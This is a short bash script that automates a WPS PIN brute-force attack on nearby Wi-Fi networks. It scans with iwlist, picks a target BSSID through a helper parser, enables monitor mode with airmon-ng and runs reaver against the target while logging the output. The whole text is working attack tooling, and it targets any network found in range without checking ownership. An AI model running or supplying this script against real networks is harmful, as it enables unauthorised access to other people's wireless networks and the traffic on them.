loc=`pwd`
wcard=$1
if [[ $1 == 'null' ]]; then
	echo I need your wireless card name, type iwconfig
	exit
fi

echo i\'m searching for WPA encrypted networks
iwlist $wcard scan | $loc/parseiwl.sh
if [ -e avaiable.list ]; then
	echo i\'gonna start arimon on $wcard
	airmon-ng start $wcard
	echo hit a button to continue...
	read
	mac=`cat $loc/avaiable.list`
	echo this is my target: $mac
	reaver -D -i mon0 -b $mac -vv -o $loc/reaver.log
	tailf $loc/reaver.log
	rm $loc/avaiable.list
	airmon-ng stop mon0
else
	echo i\'ve not found any WPA encrypted networks;
fi


exit
